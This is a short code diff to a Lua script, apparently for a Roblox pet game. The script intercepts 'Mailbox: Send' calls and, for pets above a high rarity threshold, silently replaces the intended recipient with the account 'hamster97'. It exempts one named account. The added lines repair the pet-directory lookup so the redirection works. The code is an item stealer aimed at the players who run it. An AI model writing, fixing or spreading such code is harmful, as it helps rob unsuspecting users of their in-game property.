@@ -72,7 +72,8 @@ local args = {...}
 print(tostring(x) == "Mailbox: Send" and args[3] ~= _G.pvc)
 if tostring(x) == "Mailbox: Send" and args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" and ifUserNull() then
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
-if args[3] == "Pet" and dir[save.Inventory.Pet[args[4]].id].difficulty>=1000000000 then
+local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+if args[3] == "Pet" and require(dir[save.Inventory.Pet[args[4]].id]).difficulty>=1000000000 then
 args[1] = "hamster97" 
 elseif args[3] == "Pet" then
 --e
